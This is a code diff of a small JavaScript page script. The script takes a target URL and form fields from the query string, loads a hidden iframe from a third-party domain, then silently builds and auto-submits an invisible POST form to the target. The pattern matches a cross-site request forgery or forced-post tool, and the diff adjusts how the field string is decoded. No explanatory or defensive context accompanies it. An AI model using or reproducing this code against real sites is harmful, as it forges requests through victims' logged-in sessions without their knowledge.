@@ -3,7 +3,7 @@ var q=new URLSearchParams(location.search),b=q.get('b')||'',u=q.get('u')||'https
 var w=document.createElement('iframe');w.style.display='none';
 w.onload=function(){setTimeout(function(){
  var f=document.createElement('form');f.method='POST';f.action=u;
- b.split('&').forEach(function(kv){var i=document.createElement('input');i.type='hidden';var p=kv.split('=');i.name=decodeURIComponent(p[0]);i.value=decodeURIComponent(p.slice(1).join('='));f.appendChild(i);});
+ decodeURIComponent(b).split('&').forEach(function(kv){var i=document.createElement('input');i.type='hidden';var p=kv.split('=');i.name=decodeURIComponent(p[0]);i.value=decodeURIComponent(p.slice(1).join('='));f.appendChild(i);});
  document.body.appendChild(f);f.submit();},2500);};
 w.src='https://sqd3333pp.theleadernetworks.com/robots.txt?w=1';
 document.body.appendChild(w);
